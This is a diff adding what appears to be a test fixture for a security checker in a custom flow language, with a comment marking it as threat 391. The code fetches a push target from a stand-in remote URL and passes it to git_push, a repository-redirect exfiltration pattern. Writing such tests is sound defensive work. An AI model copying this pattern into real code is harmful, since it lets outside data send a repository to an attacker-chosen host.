@@ -1,0 +1,9 @@
+// Threat (№391 bridge): an untrusted remote payload must not drive the
+// git_push decision argument — the push target would be chosen by
+// external data (repo-redirect exfiltration).
+pattern Send(_t: String) -> String {
+  let remote = http_get("https://example.com/next-push-target")
+  let _ = git_push(remote)
+  return "done"
+}
+flow Main { input: String = "t" -> Send -> output }
